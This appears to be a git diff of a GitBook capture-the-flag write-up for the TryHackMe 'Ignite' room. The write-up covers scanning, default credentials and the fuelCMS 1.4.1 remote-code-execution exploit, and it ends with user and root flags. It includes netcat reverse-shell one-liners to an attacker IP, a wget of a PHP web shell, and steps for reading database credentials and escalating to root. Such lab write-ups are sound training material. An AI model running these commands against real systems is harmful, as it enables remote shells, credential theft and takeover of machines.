@@ -1,12 +1,12 @@
 ---
-description: 'https://tryhackme.com/room/ignite'
+description: https://tryhackme.com/room/ignite
 ---
 
 # Ignite
 
 ## INIT
 
-```text
+```
 export ignite=10.10.28.158
 ping $ignite
 
@@ -15,27 +15,27 @@ echo "10.10.28.158 ignite.thm" >> /etc/hosts
 
 ## NMAP
 
-```text
+```
 nmap -sC -sV -O $ignite
 ```
 
-![](../.gitbook/assets/image%20%28458%29.png)
+![](<../.gitbook/assets/image (380).png>)
 
 ## GOBUSTER
 
-```text
+```
 gobuster dir -u $ignite -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
 ```
 
-![](../.gitbook/assets/image%20%28377%29.png)
+![](<../.gitbook/assets/image (381).png>)
 
 ## HTTP
 
-![](../.gitbook/assets/image%20%28424%29.png)
+![](<../.gitbook/assets/image (382).png>)
 
-![](../.gitbook/assets/image%20%28448%29.png)
+![](<../.gitbook/assets/image (384).png>)
 
-![](../.gitbook/assets/image%20%28405%29.png)
+![](<../.gitbook/assets/image (385).png>)
 
 {% hint style="info" %}
 login: admin
@@ -43,22 +43,22 @@ login: admin
 password: admin
 {% endhint %}
 
-![](../.gitbook/assets/image%20%28421%29.png)
+![](<../.gitbook/assets/image (386).png>)
 
-![](../.gitbook/assets/image%20%28376%29.png)
+![](<../.gitbook/assets/image (387).png>)
 
-```text
+```
 searchsploit Fuel
 searchsploit -p 47138
 ```
 
-![](../.gitbook/assets/image%20%28443%29.png)
+![](<../.gitbook/assets/image (388).png>)
 
-```text
+```
 cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ignite.py
 ```
 
-```text
+```
 # Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
 # Date: 2019-07-19
 # Exploit Author: 0xd0ff9
@@ -97,33 +97,33 @@ while 1:
 
 ```
 
-![](../.gitbook/assets/image%20%28385%29.png)
+![](<../.gitbook/assets/image (389).png>)
 
-```text
+```
 nc -e /bin/sh 10.14.4.204 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.204 4444 >/tmp
 ```
 
-![](../.gitbook/assets/image%20%28417%29.png)
+![](<../.gitbook/assets/image (395).png>)
 
-```text
+```
 cmd:bash shell.sh
 ```
 
-![](../.gitbook/assets/image%20%28440%29.png)
+![](<../.gitbook/assets/image (396).png>)
 
-```text
+```
 python3 ignite.py
 wget http://10.14.4.204:8000/phpbash.php
 ```
 
-![](../.gitbook/assets/image%20%28413%29.png)
+![](<../.gitbook/assets/image (391).png>)
 
-![](../.gitbook/assets/image%20%28428%29.png)
+![](<../.gitbook/assets/image (392).png>)
 
-![](../.gitbook/assets/image%20%28397%29.png)
+![](<../.gitbook/assets/image (393).png>)
 
-![](../.gitbook/assets/image%20%28433%29.png)
+![](<../.gitbook/assets/image (394).png>)
 
 ### User.txt
 
@@ -131,29 +131,28 @@ wget http://10.14.4.204:8000/phpbash.php
 6470e394cbf6dab6a91682cc8585059b
 {% endhint %}
 
-```text
+```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![](../.gitbook/assets/image%20%28427%29.png)
+![](<../.gitbook/assets/image (383).png>)
 
-```text
+```
  cat /var/www/html/fuel/application/config/database.php
 ```
 
-![](../.gitbook/assets/image%20%28444%29.png)
+![](<../.gitbook/assets/image (397).png>)
 
-```text
+```
 su -
 password: mememe
 cat /root/root.txt
 ```
 
-![](../.gitbook/assets/image%20%28423%29.png)
+![](<../.gitbook/assets/image (398).png>)
 
 ### Root.txt
 
 {% hint style="success" %}
 b9bbcb33e11b80be759c4e844862482d
 {% endhint %}
-
